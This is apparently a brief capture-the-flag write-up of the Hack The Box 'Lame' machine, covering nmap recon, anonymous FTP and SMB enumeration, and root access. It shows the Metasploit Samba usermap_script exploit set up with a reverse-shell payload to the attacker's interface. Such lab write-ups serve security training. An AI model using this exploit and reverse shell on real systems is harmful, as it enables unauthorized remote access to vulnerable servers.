# Lame



<figure><img src="../../../../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>

### Recon

How many of the nmap top 1000 TCP ports are open on the remote host?

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>4 Ports Open</p></figcaption></figure>

i will see the port open FTP - 21 with \
login Anonymous \
and \
Password Anonymous

```bash
ftp 10.10.10.3
```

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

but can't expliot ftp  come i will try expliot using smb

{% hint style="success" %}
With Passweord Protected OFF
{% endhint %}

```
smbclient -L 10.10.10.3
```

<figure><img src="../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Initial Access

```bash
exploit/multi/samba/usermap_script
set payload cmd/unix/reverse
set lhost tun0
set lport 443
```

<figure><img src="../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Root Flag

<figure><img src="../../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

User Flag

<figure><img src="../../../../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Exploits Used

**msfconsole**

```
exploit/multi/samba/usermap_script
```

### Tools Used

* Nmap
* smbclient
* nc

